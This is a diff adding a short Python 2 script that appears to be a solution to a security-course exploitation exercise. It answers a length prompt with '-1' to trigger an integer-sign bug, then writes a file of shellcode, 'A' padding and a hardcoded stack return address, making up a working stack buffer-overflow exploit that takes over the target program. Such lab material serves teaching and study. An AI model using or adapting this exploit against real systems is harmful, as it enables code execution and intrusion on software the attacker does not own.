@@ -1,0 +1,22 @@
+#!/usr/bin/env python2
+
+import scaffold as p
+from scaffold import SHELLCODE
+
+with open('hack', 'w') as f:
+    f.write("Hello world!\n")
+
+### YOUR CODE STARTS HERE ###
+p.start()
+assert p.recv(30) == 'How many bytes should I read? '
+
+p.send('-1\n')
+
+with open('hack', 'w') as f:
+    f.write(SHELLCODE + (148 - len(SHELLCODE)) * 'A' + '\xa8\xd5\xff\xff' + '\n')
+
+
+assert p.recv(18) == 'Here is the file!\n'
+print p.recv(12)
+
+### YOUR CODE ENDS HERE ###
